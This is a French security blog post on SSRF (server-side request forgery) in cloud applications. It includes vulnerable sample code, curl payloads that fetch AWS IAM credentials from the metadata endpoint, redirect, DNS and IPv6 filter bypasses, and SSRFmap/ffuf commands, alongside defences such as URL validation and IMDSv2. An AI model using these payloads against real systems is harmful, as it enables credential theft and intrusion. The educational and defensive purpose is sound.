---
title: "Les vulnérabilités SSRF en 2025 : techniques d'exploitation avancées"
date: 2025-11-28
category: Web Security
author: CyberInsight Team
excerpt: "Une plongée technique dans les Server-Side Request Forgery modernes, avec des cas pratiques d'exploitation sur des applications cloud natives."
---

# Les vulnérabilités SSRF en 2025 : techniques d'exploitation avancées

## Introduction

Les vulnérabilités SSRF (Server-Side Request Forgery) continuent d'être un vecteur d'attaque majeur en 2025, particulièrement dans les environnements cloud. Cet article explore les techniques modernes d'exploitation et les contournements de protections.

## Qu'est-ce qu'une SSRF ?

Une SSRF permet à un attaquant de forcer un serveur à effectuer des requêtes HTTP vers des destinations arbitraires. Cela peut mener à :

- Accès aux métadonnées cloud (AWS, Azure, GCP)
- Scan de ports internes
- Accès à des services internes non exposés
- Exfiltration de données sensibles

## Cas pratique : Exploitation sur AWS

### Scénario

Application web permettant de télécharger des images depuis une URL :

```python
import requests

def download_image(url):
    # VULNERABLE CODE
    response = requests.get(url)
    return response.content
```

### Exploitation

```bash
# Accès aux métadonnées AWS
curl "https://vulnerable-app.com/download?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Récupération des credentials IAM
curl "https://vulnerable-app.com/download?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-server-role"
```

## Techniques de bypass

### Bypass de whitelist avec redirect

```python
# Serveur attaquant avec redirection
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect')
def redirect_to_metadata():
    return redirect('http://169.254.169.254/latest/meta-data/', code=302)
```

### Bypass DNS

```bash
# Utiliser un domaine qui résout vers une IP interne
# Créer un enregistrement DNS A pointant vers 127.0.0.1
dig attacker.com
# => 127.0.0.1
```

### Bypass avec IPv6

```bash
# Utiliser la notation IPv6 pour contourner les filtres
http://[::ffff:127.0.0.1]/admin
http://[0:0:0:0:0:ffff:127.0.0.1]/admin
```

## Défenses recommandées

### Validation stricte des URLs

```python
from urllib.parse import urlparse
import ipaddress

ALLOWED_SCHEMES = ['http', 'https']
BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),  # AWS metadata
]

def is_safe_url(url):
    parsed = urlparse(url)
    
    # Vérifier le schéma
    if parsed.scheme not in ALLOWED_SCHEMES:
        return False
    
    # Résoudre l'IP
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        
        # Vérifier si l'IP est dans un réseau bloqué
        for network in BLOCKED_NETWORKS:
            if ip in network:
                return False
                
        return True
    except:
        return False
```

### Configuration AWS IMDSv2

```bash
# Forcer l'utilisation d'IMDSv2 (protection contre SSRF)
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-put-response-hop-limit 1
```

## Outils de détection

```bash
# Scanner avec SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles

# Fuzzing avec ffuf
ffuf -w ssrf-payloads.txt -u https://target.com/download?url=FUZZ
```

## Impact réel

### Cas Capital One (2019)

L'attaque Capital One, bien que datant de 2019, reste un exemple classique :

- Exploitation d'une SSRF dans l'application web
- Accès aux métadonnées AWS EC2
- Vol de 100 millions de dossiers clients
- Amende de 80 millions de dollars

## Conclusion

Les SSRF restent une vulnérabilité critique en 2025. Avec la migration massive vers le cloud, l'impact potentiel est plus important que jamais. Une défense en profondeur combinant validation stricte, segmentation réseau et configuration sécurisée des métadonnées cloud est essentielle.

---

## Ressources

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy - SSRF](https://portswigger.net/web-security/ssrf)
- [SSRFmap Tool](https://github.com/swisskyrepo/SSRFmap)

**Tags:** #ssrf #websecurity #aws #cloud #pentest
